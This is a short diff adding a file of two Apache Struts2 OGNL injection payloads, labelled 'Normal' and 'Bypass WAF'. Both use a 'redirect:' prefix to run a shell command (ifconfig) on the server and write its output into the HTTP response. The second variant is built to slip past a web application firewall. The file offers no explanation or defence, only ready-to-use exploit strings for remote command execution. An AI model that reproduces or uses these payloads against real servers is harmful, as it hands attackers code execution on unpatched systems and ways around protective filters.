@@ -1,0 +1,7 @@
+Normal:
+
+redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{‘ ifconfig’})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}
+
+Bypass WAF:
+
+redirect:http://www.goal.com/${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{‘ ifconfig’})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}
